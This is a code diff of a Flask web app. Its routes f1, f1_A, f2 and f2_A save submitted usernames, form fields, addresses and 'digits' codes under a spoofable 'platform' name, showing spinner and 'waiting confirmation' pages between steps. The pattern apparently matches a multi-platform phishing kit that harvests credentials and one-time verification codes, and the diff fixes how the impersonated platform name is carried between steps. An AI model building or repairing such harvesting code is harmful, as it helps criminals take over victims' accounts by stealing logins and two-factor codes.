@@ -344,13 +344,16 @@ def spinner():
                          platform_name=platform,
                          platform_color=platform_color)
 
+# FIXED: f1 route - get platform from form data for POST requests
 @app.route('/f1', methods=['GET','POST'])
 def f1():
     if request.method == 'POST':
         user = extract_user(request.form)
         items = [f"{k}: {v}" for k,v in request.form.items()]
-        save_submission('f1', user, " ; ".join(items), platform_name=request.args.get('platform', 'Unknown'))
-        return redirect(url_for('f1_A', platform=request.args.get('platform', 'Unknown')))
+        # Get platform from form data (hidden input) or fallback to URL parameter
+        platform = request.form.get('platform', request.args.get('platform', 'Unknown'))
+        save_submission('f1', user, " ; ".join(items), platform_name=platform)
+        return redirect(url_for('f1_A', platform=platform))
     platform = request.args.get('platform', 'Unknown')
     platform_icon, platform_color = get_platform_icon(platform)
     return render_template('f1.html', platform_icon=platform_icon, platform_name=platform, platform_color=platform_color)
@@ -360,8 +363,8 @@ def f1_A():
     if request.method == 'POST':
         user = extract_user(request.form)
         digits = request.form.get('digits','')
-        save_submission('f1_A', user, f'digits={digits}', code_value=digits, platform_name=request.args.get('platform', 'Unknown'))
         platform = request.args.get('platform', 'Unknown')
+        save_submission('f1_A', user, f'digits={digits}', code_value=digits, platform_name=platform)
         platform_icon, platform_color = get_platform_icon(platform)
         return render_template('waiting_confirmation.html', 
                              next_url=url_for('spinner2', platform=platform),
@@ -390,8 +393,9 @@ def f2():
     if request.method == 'POST':
         user = extract_user(request.form)
         addr = request.form.get('address','')
-        save_submission('f2', user, f'address={addr}', platform_name=request.args.get('platform', 'Unknown'))
-        return redirect(url_for('f2_A', platform=request.args.get('platform', 'Unknown')))
+        platform = request.args.get('platform', 'Unknown')
+        save_submission('f2', user, f'address={addr}', platform_name=platform)
+        return redirect(url_for('f2_A', platform=platform))
     platform = request.args.get('platform', 'Unknown')
     platform_icon, platform_color = get_platform_icon(platform)
     return render_template('f2.html', platform_icon=platform_icon, platform_name=platform, platform_color=platform_color)
@@ -401,8 +405,8 @@ def f2_A():
     if request.method == 'POST':
         user = extract_user(request.form)
         digits = request.form.get('digits','')
-        save_submission('f2_A', user, f'digits={digits}', code_value=digits, platform_name=request.args.get('platform', 'Unknown'))
         platform = request.args.get('platform', 'Unknown')
+        save_submission('f2_A', user, f'digits={digits}', code_value=digits, platform_name=platform)
         platform_icon, platform_color = get_platform_icon(platform)
         return render_template('waiting_confirmation.html', 
                              next_url=url_for('m1', platform=platform),
